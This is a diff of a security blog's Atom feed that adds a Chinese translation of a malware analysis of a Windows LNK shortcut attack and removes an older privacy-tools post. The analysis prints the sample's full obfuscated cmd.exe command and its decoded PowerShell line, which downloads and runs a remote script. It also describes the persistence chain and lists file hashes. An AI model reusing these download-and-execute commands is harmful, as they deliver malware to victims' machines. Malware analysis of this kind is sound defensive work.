@@ -1,4 +1,149 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="https://security-onigiri.github.io//feed.xml" rel="self" type="application/atom+xml" /><link href="https://security-onigiri.github.io//" rel="alternate" type="text/html" /><updated>2018-12-22T00:55:53+08:00</updated><id>https://security-onigiri.github.io//feed.xml</id><entry><title type="html">如何當個貓ware研究者</title><link href="https://security-onigiri.github.io//2018/12/09/ware.html" rel="alternate" type="text/html" title="如何當個貓ware研究者" /><published>2018-12-09T00:00:00+08:00</published><updated>2018-12-09T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/12/09/ware</id><content type="html" xml:base="https://security-onigiri.github.io//2018/12/09/ware.html">&lt;h1 id=&quot;how-to-become-and-remain-a-malware-researcher&quot;&gt;How to Become (and Remain) a Malware Researcher&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="https://security-onigiri.github.io//feed.xml" rel="self" type="application/atom+xml" /><link href="https://security-onigiri.github.io//" rel="alternate" type="text/html" /><updated>2019-03-23T16:19:31+08:00</updated><id>https://security-onigiri.github.io//feed.xml</id><entry><title type="html">看我如何分析 Windows LNK 檔案攻擊</title><link href="https://security-onigiri.github.io//2019/03/23/windows-lnk.html" rel="alternate" type="text/html" title="看我如何分析 Windows LNK 檔案攻擊" /><published>2019-03-23T00:00:00+08:00</published><updated>2019-03-23T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2019/03/23/windows-lnk</id><content type="html" xml:base="https://security-onigiri.github.io//2019/03/23/windows-lnk.html">&lt;h1 id=&quot;看我如何分析-windows-lnk-檔案攻擊&quot;&gt;&lt;strong&gt;看我如何分析 Windows LNK 檔案攻擊&lt;/strong&gt;&lt;/h1&gt;
+
+&lt;p&gt;&lt;strong&gt;翻譯文章來源:&lt;/strong&gt; dexters-lab.net&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;原文&lt;/strong&gt;：https://dexters-lab.net/2019/02/16/analyzing-the-windows-lnk-file-attack-method/&lt;/p&gt;
+
+&lt;p&gt;最近我的一個朋友分享了一個有趣的惡意樣本，它是一個微軟捷徑檔（LNK檔案），點擊（執行）後導致感染，在研究之前我並不知道2017的時候就有這樣的攻擊手法，這種類型的攻擊也有所增加，我感到很驚訝。
+在這篇文章中，我們將分析 LNK 檔案惡意軟體並揭示攻擊者如何使用多層混淆來逃避 AV 並最終丟棄惡意二進制檔案，我們還將研究如何對每個層進行去解混淆，並了解代碼正在做什麼。&lt;/p&gt;
+
+&lt;h2 id=&quot;動機&quot;&gt;&lt;strong&gt;動機&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;令我感興趣的原因是因為樣本本身看起來十分無辜，以及從社交工程的角度看它是多麼有說服力。作為一個捷徑，它對普通用戶來說並不可疑，因為它不是EXE。接下來，當用戶點擊時，會彈出一個瀏覽器視窗，它會打開鏈接 &lt;a href=&quot;https://get.adobe.com/br/flashplayer/&quot;&gt;https://get.adobe.com/br/flashplayer/&lt;/a&gt; 這會讓用戶認為他的系統中缺少一個flash插件，這就是為什麼他無法打開/執行該檔案，但一旦他安裝了 Flash 播放器，當他再次嘗試打開捷徑且意識到它只是一個垃圾檔案時，已經太晚了。&lt;/p&gt;
+
+&lt;p&gt;但實際發生的是它在背景中通過 shell 命令執行 Powershell 命令來下載 Powershell 腳本，該腳本執行主要惡意檔案的實際下載和安裝。它下載的檔案是一個 BMP 檔案，它看起來是一個無辜的圖像檔案，但它實際上是一個偽裝的 Powershell 檔案。&lt;/p&gt;
+
+&lt;h2 id=&quot;什麼是lnk檔案&quot;&gt;&lt;strong&gt;什麼是LNK檔案？&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;LNK 是 Microsoft Windows 用於指向可執行檔案或應用程序的捷徑方式檔案的檔案副檔名。LNK 檔案通常用於創建開始菜單和桌面快捷方式。LNK代表LiNK。LNK檔案可以通過更改圖標偽裝成合法檔案，但在此案例並沒有完成。&lt;/p&gt;
+
+&lt;h2 id=&quot;基本分析&quot;&gt;&lt;strong&gt;基本分析&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;以下是一般檔案屬性的外觀。&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://dexters-lab.net/2019/02/16/analyzing-the-windows-lnk-file-attack-method/file-type.png&quot;&gt;&lt;img src=&quot;https://dexters-lab.net/2019/02/16/analyzing-the-windows-lnk-file-attack-method/file-type.png&quot; alt=&quot;&quot; title=&quot;惡意鏈接檔案&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;看一下_Shortcut_選項卡會給我們提供更多細節，下面是它的樣子。&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://dexters-lab.net/2019/02/16/analyzing-the-windows-lnk-file-attack-method/lnk-file-target.png&quot;&gt;&lt;img src=&quot;https://dexters-lab.net/2019/02/16/analyzing-the-windows-lnk-file-attack-method/lnk-file-target.png&quot; alt=&quot;&quot; title=&quot;LNK檔案定位應用程序&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;正如您在 Target 欄位中看到的那樣，它指向 cmd.exe 並帶有一些參數。這是在執行此 LNK 檔案時運行的命令。但這不是整個命令。&lt;br /&gt;
+捷徑的 Target 欄位最大為260個字元。任何比這更長的內容都不可見。但是 command line 參數的最大長度為 4096 個字符，因此我們無法在上面的窗口中看到整個命令。我必須用另一個工具來提取整個命令。&lt;/p&gt;
+
+&lt;h2 id=&quot;深入研究-lnk-檔案格式&quot;&gt;&lt;strong&gt;深入研究 LNK 檔案格式&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;使用 LNK 檔案分析工具，我們可以設法獲得整個嵌入在檔案裏面的命令，如下所示&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://dexters-lab.net/2019/02/16/analyzing-the-windows-lnk-file-attack-method/lnk-file-cmd-report.png&quot;&gt;&lt;img src=&quot;https://dexters-lab.net/2019/02/16/analyzing-the-windows-lnk-file-attack-method/lnk-file-cmd-report.png&quot; alt=&quot;&quot; title=&quot;Extracting command from LNK file&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;根據上面提取出的 LNK 檔案內容我們可以找到一些有趣的欄位：
+| KEY | VALUE |
+| — | — |
+| Relative path | ..\..\..\..\Windows\system32\cmd.exe |
+| Working Directory | %SystemRoot%\System32 |
+| Arguments | /V /C set x4OAGWfxlES02z6NnUkK=2whttpr0&amp;amp;&amp;amp;… |&lt;/p&gt;
+
+&lt;p&gt;讓我們仔細看看 Arguments，如下所示：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;c:\\Windows\\system32\\cmd.exe /V /C set x4OAGWfxlES02z6NnUkK=2whttpr0&amp;amp;&amp;amp;set L1U03HmUO6B9IcurCNNlo4=.com&amp;amp;&amp;amp; echo | start %x4OAGWfxlES02z6NnUkK:~2,4%s://get.adobe%L1U03HmUO6B9IcurCNNlo4%/br/flashplayer/ &amp;amp;&amp;amp;set aZM4j3ZhPLBn9MpuxaO= -win 1 &amp;amp;&amp;amp;set MlyavWfE=ndows&amp;amp;&amp;amp;set jA8Axao1xcZ=iEx&amp;amp;&amp;amp;set WMkgA3uXa1pXx=tRi&amp;amp;&amp;amp;set KNhGmAqHG5=bJe&amp;amp;&amp;amp;set 4kxhaz6bqqKC=LOad&amp;amp;&amp;amp;set rwZCnSC7T=nop&amp;amp;&amp;amp;set jcCvC=NEw&amp;amp;&amp;amp;set ZTVZ=wEbc&amp;amp;&amp;amp;set DABThzRuTT2hYjVOy=nt).dow&amp;amp;&amp;amp;set cwdOsPOdA08SZaXVp1eFR=t NeT.&amp;amp;&amp;amp;set Rb=Ers&amp;amp;&amp;amp;set j4HfRAqYXcRZ3R=hEll&amp;amp;&amp;amp;set Kpl01SsXY5tthb1=.bmp&amp;amp;&amp;amp;set vh7q6Aq0zZVLclPm=\\v1.0\\&amp;amp;&amp;amp;set 2Mh=pOw&amp;amp;&amp;amp;set 8riacao=%x4OAGWfxlES02z6NnUkK:~2,4%s://s3-eu-west-1.amazonaws%L1U03HmUO6B9IcurCNNlo4%/juremasobra2/jureklarj934t9oi4%Kpl01SsXY5tthb1%&amp;amp;&amp;amp;@echo off &amp;amp;&amp;amp; %SystemDrive% &amp;amp;&amp;amp; cd\ &amp;amp;&amp;amp; cd %SystemRoot%\\System32 &amp;amp;&amp;amp;echo %jA8Axao1xcZ%(&quot;%jA8Axao1xcZ%(!jcCvC!-o%KNhGmAqHG5%c!cwdOsPOdA08SZaXVp1eFR!!ZTVZ!Lie!DABThzRuTT2hYjVOy!n%4kxhaz6bqqKC%S%WMkgA3uXa1pXx%NG('%x4OAGWfxlES02z6NnUkK:~2,4%s://s3-eu-west-1.amazonaws%L1U03HmUO6B9IcurCNNlo4%/juremasobra2/jureklarj934t9oi4%Kpl01SsXY5tthb1%')&quot;); | Wi!MlyavWfE!!2Mh!!Rb!!j4HfRAqYXcRZ3R!!vh7q6Aq0zZVLclPm!!2Mh!!Rb!!j4HfRAqYXcRZ3R! -!rwZCnSC7T!!aZM4j3ZhPLBn9MpuxaO! -  &amp;gt;
+
+set x4OAGWfxlES02z6NnUkK=2whttpr0
+set L1U03HmUO6B9IcurCNNlo4=.com
+echo | start         %x4OAGWfxlES02z6NnUkK:~2,4%s://get.adobe%L1U03HmUO6B9IcurCNNlo4%/br/flashplayer/
+set aZM4j3ZhPLBn9MpuxaO= -win 1
+set MlyavWfE=ndows
+set jA8Axao1xcZ=iEx
+set WMkgA3uXa1pXx=tRi
+set KNhGmAqHG5=bJe
+set 4kxhaz6bqqKC=LOad
+set rwZCnSC7T=nop
+set jcCvC=NEw
+set ZTVZ=wEbc
+set DABThzRuTT2hYjVOy=nt).dow
+set cwdOsPOdA08SZaXVp1eFR=t NeT.
+set Rb=Ers
+set j4HfRAqYXcRZ3R=hEll
+set Kpl01SsXY5tthb1=.bmp
+set vh7q6Aq0zZVLclPm=\\v1.0\\
+set 2Mh=pOw
+set 8riacao=%x4OAGWfxlES02z6NnUkK:~2,4%s://s3-eu-west-1.amazonaws%L1U03HmUO6B9IcurCNNlo4%/juremasobra2/jureklarj934t9oi4%Kpl01SsXY5tthb1%
+@echo off
+%SystemDrive%
+cd\\
+cd %SystemRoot%\\System32
+echo %jA8Axao1xcZ%(&quot;%jA8Axao1xcZ%(!jcCvC!-o%KNhGmAqHG5%c!cwdOsPOdA08SZaXVp1eFR!!ZTVZ!Lie!DABThzRuTT2hYjVOy!n%4kxhaz6bqqKC%S%WMkgA3uXa1pXx%NG('%x4OAGWfxlES02z6NnUkK:~2,4%s://s3-eu-west-1.amazonaws%L1U03HmUO6B9IcurCNNlo4%/juremasobra2/jureklarj934t9oi4%Kpl01SsXY5tthb1%')&quot;); | Wi!MlyavWfE!!2Mh!!Rb!!j4HfRAqYXcRZ3R!!vh7q6Aq0zZVLclPm!!2Mh!!Rb!!j4HfRAqYXcRZ3R! -!rwZCnSC7T!!aZM4j3ZhPLBn9MpuxaO! --%ProgramFiles%\\Internet Explorer\\iexplore.exe
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;每一行都是shell命令。第一行是設置一些環境變數然後在第3行，最後一行使用這些環境變數來組裝這些變量並執行它們。這種組裝和反組譯變數名的方法使代碼更難閱讀。&lt;/p&gt;
+
+&lt;p&gt;上面混淆的 shell 腳本解碼為以下兩個命令：&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Windows\system32\cmd.exe /V /C set x4OAGWfxlES02z6NnUkK=2whttpr0&amp;amp;&amp;amp;set L1U03HmUO6B9IcurCNNlo4=.com &amp;amp;&amp;amp; echo | start https://get.adobe.com/br/flashplayer/&lt;/code&gt; 此命令在瀏覽器打開adobe flashplayer安裝頁面。&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;echo iEx(&quot;iEx(New-Object Net.WebClient).DownloadString('hxxps://s3-eu-west-1.amazonaws.com/juremasobra2/jureklarj934t9oi4.bmp')&quot;); | WindowsPowershell\v1.0\Powershell -nop -win 1 --%ProgramFiles%\\Internet Explorer\\iexplore.exe&lt;/code&gt; 這個命令實際下載了第二層 Powershell ，該檔案偽裝成 URL 中的 BMP 檔案&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;解碼第二層-powershell&quot;&gt;&lt;strong&gt;解碼第二層 Powershell&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;由上面的LNK檔案下載的Powershell腳本可以在此&lt;a href=&quot;https://github.com/d3xt3rsl4b/analyzed-malware/blob/master/lnk_malware/jureklarj934t9oi4.ps1&quot;&gt;點我&lt;/a&gt; fd60a8b790b42f0c416c28e4ad22dc317ad8fbc5 上找到，它被嚴重混淆，使用&lt;a href=&quot;http://www.powertheshell.com/obfuscationmode/&quot;&gt;ISESteriods&lt;/a&gt;進行混淆。我確實設法解碼腳本，可以在此&lt;a href=&quot;https://github.com/d3xt3rsl4b/analyzed-malware/blob/master/lnk_malware/decoded.ps1&quot;&gt;點我&lt;/a&gt;上找到可讀代碼。&lt;/p&gt;
+
+&lt;p&gt;執行腳本執行以下操作：&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;檢查它是否在虛擬機內部運行，如果它正在運行，則它不執行其餘命令並退出。否則，它將處理為後續步驟。該腳本檢查以下虛擬機列表：
+    &lt;ol&gt;
+      &lt;li&gt;VirtualBox的&lt;/li&gt;
+      &lt;li&gt;VMware虛擬平台&lt;/li&gt;
+      &lt;li&gt;虛擬機&lt;/li&gt;
+      &lt;li&gt;HVM domU&lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+  &lt;li&gt;然後它創建一個名為 444444444444 的 Mutex，這是為了確保該電腦只運行一個這個程序。&lt;/li&gt;
+  &lt;li&gt;如果上一步成功，則下載一個zip，再次偽裝成一個圖像檔案，來自以下URL hxxps：//s3-eu-west-1[.]amazonaws[.]com/juremasobra2/image2.png，Hash 即887eafc19419df5119a829fd05d898503b7a0217”&lt;/li&gt;
+  &lt;li&gt;將PNG檔案重命名為ZIP檔案&lt;/li&gt;
+  &lt;li&gt;從包含DLL 92be09ca93ad6a8b04b7e2e2087fc6884fef1f63 的zip檔案中提取內容，並將此檔案複製到啟動資料夾。&lt;/li&gt;
+  &lt;li&gt;然後它通過在 Startup 資料夾中創建捷徑方式檔案來讓它能夠繼續存在電腦裡面，此快捷方式檔案（第二個 LNK）在命令 shell 中調用 run32.dll 來運行惡意 DLL 二進制檔案。由於 run32.dll 是一個內置的簽名二進制檔案，因此不會引起更多懷疑。例如，此命令 &lt;em&gt;rundll32.exe shell32.dll，ShellExec_RunDLL notepad.exe&lt;/em&gt; 將啟動 notepad.exe。&lt;/li&gt;
+  &lt;li&gt;然後腳本會停留 40 秒，然後重新啟動機器。&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;通過上述攻擊，技術攻擊者試圖將其惡意DLL二進制檔案隱藏在合法二進制檔案後面。&lt;/p&gt;
+
+&lt;p&gt;可以在此&lt;a href=&quot;https://blogs.technet.microsoft.com/motiba/2017/11/04/chasing-adversaries-with-autoruns-evading-techniques-and-countermeasures/&quot;&gt;鏈接&lt;/a&gt;上找到有關這手法的更多信息&lt;/p&gt;
+
+&lt;h2 id=&quot;所有的檔案&quot;&gt;&lt;strong&gt;所有的檔案&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;SHA1&lt;/th&gt;
+      &lt;th&gt;Description&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;af6df15050dea1a756bb99bb0597d7072c2aee4c&lt;/td&gt;
+      &lt;td&gt;惡意 LNK 檔案&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;fd60a8b790b42f0c416c28e4ad22dc317ad8fbc5&lt;/td&gt;
+      &lt;td&gt;Powershell 檔案由上述 LNK 下載&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;887eafc19419df5119a829fd05d898503b7a0217&lt;/td&gt;
+      &lt;td&gt;ZIP 檔案由上述 Powershell 下載&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;92be09ca93ad6a8b04b7e2e2087fc6884fef1f63&lt;/td&gt;
+      &lt;td&gt;惡意 DLL 檔案由上述 ZIP 檔案解開&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;參考&quot;&gt;&lt;strong&gt;參考&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.dfir.training/windows/lnk/116-windows-shortcut-file-lnk-format/file&quot;&gt;LNK file format&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://securitynews.sonicwall.com/xmlpost/lnk-file-is-actively-being-leveraged-to-run-file-less-powershell-script/&quot;&gt;Other attacks similar to this&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://blog.trendmicro.com/trendlabs-security-intelligence/rising-trend-attackers-using-lnk-files-download-malware/&quot;&gt;TreadMicro blog no treads on this type of attacks&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;</content><author><name>JohnThunder</name></author><category term="Malware" /><category term="DFIR" /><summary type="html">看我如何分析 Windows LNK 檔案攻擊</summary></entry><entry><title type="html">如何當個貓ware研究者</title><link href="https://security-onigiri.github.io//2018/12/09/ware.html" rel="alternate" type="text/html" title="如何當個貓ware研究者" /><published>2018-12-09T00:00:00+08:00</published><updated>2018-12-09T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/12/09/ware</id><content type="html" xml:base="https://security-onigiri.github.io//2018/12/09/ware.html">&lt;h1 id=&quot;how-to-become-and-remain-a-malware-researcher&quot;&gt;How to Become (and Remain) a Malware Researcher&lt;/h1&gt;
 
 &lt;p&gt;I am writing this post as requested by Peerlyst. In this post, I will present my unique take on both becoming and remaining a Malware Researcher.&lt;/p&gt;
 
@@ -1252,235 +1397,4 @@ unsigned long* base = findbase();
 
 &lt;blockquote&gt;
   &lt;p&gt;給點清了某些事情的&lt;a href=&quot;https://reverse.put.as/2017/11/07/exploiting-cve-2017-5123/&quot;&gt;Federico Bento&lt;/a&gt;一個大大的讚， &lt;a href=&quot;https://salls.github.io/Linux-Kernel-CVE-2017-5123/&quot;&gt;Chris Salls&lt;/a&gt;也是，感謝他的 Chrome 沙盒逃脫漏洞利用; 我的漏洞利用大多數是基於他們的成果。&lt;/p&gt;
-&lt;/blockquote&gt;</content><author><name>jhe</name></author><category term="Docker" /><category term="CVE" /><category term="Linux" /><summary type="html">The post describes how I exploited the waitid() vulnerability in order to modify the Linux capabilities of a Docker container to gain elevated privileges, and ultimately escape the container jail. If you wnat to see how Twistlock would stop this vulnerability in its tracks, check out my follow up blog.</summary></entry><entry><title type="html">珍惜隱私遠離 Google</title><link href="https://security-onigiri.github.io//2018/03/08/taking-privacy-seriously-leaving-google-behind.html" rel="alternate" type="text/html" title="珍惜隱私遠離 Google" /><published>2018-03-08T00:00:00+08:00</published><updated>2018-03-08T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/03/08/taking-privacy-seriously-leaving-google-behind</id><content type="html" xml:base="https://security-onigiri.github.io//2018/03/08/taking-privacy-seriously-leaving-google-behind.html">&lt;h1 id=&quot;taking-privacy-seriously-leaving-google-behind&quot;&gt;Taking privacy seriously leaving google behind&lt;/h1&gt;
-
-&lt;p&gt;Recently, I made the decision to become a little more seucure on the internet. I don’t have much to hide except maybe bank account info, but I was struck by a Glenn Greenwald quote from a TED Talk he gave about privacy.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;最近，我做了成為一個在網際網路上多多一點安全的決定。除了我的銀行帳戶資訊我沒有什麼好隱藏的，但我被 Gleen Greenwald 在 TED 有關隱私的演講給打擊了。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Over the last 16 months, as I’ve debated this issue around the world, every single time somebody has said to me, “I don’t really worry about invasions of privacy because I don’t have anything to hide.” I always say the same thing to them. I get out a pen, I write down my email address. I say, “Here’s my email address. What I want you to do when you get home is email me the passwords to all of your email accounts, not jsut the nice, respectable work one in your name, but all of them, because I want to be able to just troll through what it is your’re doing online, read what I want to read and publish whatever I find interesting. After all, if you’re not a bad person, if you’re doing nothing wrong, you should have nothing to hide.” Not a single person has taken me up on that offer.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;過去的16個月，我跟全世界辯論這個議題，當每次某個人對我說 “我並不擔心隱私權的侵犯，我並沒有甚麼東西好隱藏的。” 我總是對他們說一同樣的話。我拿出一枝筆，寫下我的電子郵件地址，並且對他們說 “這是我的電子郵件地址。我要你做的是，當你回到家就把你所有的電子郵件帳戶密碼寄給我，不只是要工作用漂漂亮亮的那個，而是要全部。因為我要能搜索你在網路上做的事情，知道且公布任何我想要知道的有趣事情。畢竟，如果你不是一個壞人，如果你沒有做任何不對的事情，你應該沒什麼好隱藏的。” 沒有一個人肯接受我的提議。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;I find myself tired of knowing Google is going through the content of my emails and examining my searches to sell me things.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;我發現自己已經厭倦於知道 Google 從頭到尾瀏覽我的電子郵件內容，並檢查我的搜尋紀錄，為的是賣東西給我。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;I also know our new goverment (not that our old was too much better) is tracking the activities of anyone who is anti-fascist. I don’t trust them to follow the laws that would otherwise keep me secure from illegal search.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;我也知道我們的新政府(我們的舊政府並沒有好一點)正在追蹤任何反法西斯分子的活動情形。我不相信只要遵守法律便能使我安全的遠離非法搜索。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;So I set out to become more private and that meant leaving Google products and using encrypted, more secure alternatives.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;所以打算變得更有隱私，那就表示遠離 Google 產品並且使用加密與更安全的替代方案。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;So what I have I found ? Well, I have spent the last weeks and months testing products and making decisions on what I would do.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;所以我發現了甚麼 ? 哎呀，我費了數個月直到上個星期，都在測試產品並決定我開怎麼做。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Here is what I found.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;這是我的發現。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;&lt;strong&gt;Browser:&lt;/strong&gt;&lt;/p&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;&lt;strong&gt;瀏覽器:&lt;/strong&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;The first, maybe the easiest step was changing my browser away from Google’s Chrome browser. I decided to go with Firefox’s nightly builds because they seem to run faster and feel a bit more Chrome like, so the switch wouldn’t be so shocking. With Firefox account syncing options, it wasn’t hard to get my bookmarks synced across a few devices with ease.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;首先，或許最簡單的步驟是換掉我的 Google Chrome 瀏覽器。我決定使用 Firefox 的 nightly，因為它們似乎運行得更快而且感覺跟 Chrome 很像，所以移轉比較沒有障礙。用 Firefox 帳戶同步選項，自在的跨數個裝置同步我的書籤並不難。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;I also installed some plugins, thanks to recommendations from PrivacyTools.io, a site you should frequent for tips on internet privacy. I am now running Ublock Origin to block ads and trackers along with Privacy Badger and HTTPS Everywhere.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;我也安裝的了一些插件，感謝 PrivacyTools.io 的建議，一個你應該常常造訪的網站，獲取一些網路隱私的小技巧。我現正使用 Ublock Origin 來阻擋廣告與追蹤和 Privacy Badger 與 HTTPS Everywhere。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Alternatively, I run Tor Browser, a Firefox fork if I want an even greater layer of privacy.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;或者，我使用 Tor 瀏覽器，一個 Firefox 分支，如果想要更安全的隱私層級的話。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;&lt;strong&gt;Search:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;&lt;strong&gt;搜尋:&lt;/strong&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Who doesn’t use Google to find things? Sure, we all know that weird friend who users Yahoo still, or that one guy who still owns a Zune who uses Bing, but Google has it all.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;誰不使用 Google 來找尋事物? 當然，我們都有那種仍使用 Yahoo 的奇怪朋友，或是那個還擁有一台 Zune(編按: 微軟公司出品的可攜式媒體撥放器) 並使用 Bing 的人，但 Google 擁有一切。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;I started with the always popular DuckDuckGo, but I found I didn’t get very good search results and it seemed to load really slow for me. Thankfully, thanks to PrivacyTools, I discovered &lt;a href=&quot;https://www.startpage.com/&quot;&gt;StartPage&lt;/a&gt;.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;我一開始使用很夯的 DuckDuckGo，但我發現我不能得到很好的搜尋結果而且它貌似對我來說載入的頗為龜速，謝天謝地，感謝 PrivacyTools，我偶然發現 &lt;a href=&quot;https://www.startpage.com/&quot;&gt;StartPage&lt;/a&gt;。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;StartPage anonymiszes your searches through Google, so you will still get the quality Google results without them seeing you, and without the ads, It easily integrates right into Firefox on desktop and mobile.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;StartPage 匿名化你的 Google 搜尋，所以你將仍然可以獲得有品質的 Google 結果而不備他們看見，還沒有廣告，它簡易的整合進了 Firefox 桌面板與移動版。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;&lt;strong&gt;VPN:&lt;/strong&gt;&lt;/p&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;&lt;strong&gt;VPN:&lt;/strong&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;When it came to choosing a VPN, I went through many trials. I asked for recommendations and started with the most poular, Private Internet Access, but I didn’t like that they were based in the US, but also found their speeds not all that great. Next I tried NordVPN. The speeds were actually greate on my iPhone, but they don’t offer a native Linux app setting up their different servers was kind of pain.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;當我來到要選擇一個 VPN 時，我嘗試了好幾個實驗。我尋求了建議並從人氣最旺的開始，Private Internet Access(編按:一個匿名的私人 VPN 服務)，但我不喜歡它位在美國，但也因為他們的速度不是很理想。下一個我試了 NordVPN。在我的 iPhone 上速度不錯，但他們沒有原生 Linux 應用程式設定他們不同的伺服器是一大痛點。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Finally, I settled on one was recommended a few times, Mullvad. The price is good ($5/mo), and the speeds are wonderful. I use OpenVPN on my phone, but for my laptop running Linux Mint, and for my media server at home, and old Mac, they offer a native app which makes connecting easy.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;最後，我決定用被建議過數次的，&lt;a href=&quot;https://www.mullvad.net/&quot;&gt;Mullvad&lt;/a&gt;。價錢不錯 ($5/mo)，而且速度卓越。在手機上我使用 OpenVPN，還有我運行 Linux Mint 的筆記型電腦，還有我在家裡的數位媒體伺服器，跟舊 Mac，他們提供了原生應用程式可以很簡單的連接起來。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;I also have a free VPN account with &lt;a href=&quot;https://protonvpn.com/&quot;&gt;ProtonVPN&lt;/a&gt;, and another with &lt;a href=&quot;http://www.riseup.net/&quot;&gt;RiseUp&lt;/a&gt;.
-These secondary options, which give me okay speeds, allow me backups if shomethings goes wrong with Mullvad.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;我還有一個免費的 &lt;a href=&quot;https://protonvpn.com/&quot;&gt;ProtonVPN&lt;/a&gt; 帳戶，還有另一個 &lt;a href=&quot;http://www.riseup.net/&quot;&gt;RiseUp&lt;/a&gt; 的。這些次要選項，有著還 ok 的速度，在 Mullvad 出甚麼問題的時候可以讓我可以備用。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;&lt;strong&gt;Communications:&lt;/strong&gt;&lt;/p&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;&lt;strong&gt;通訊:&lt;/strong&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
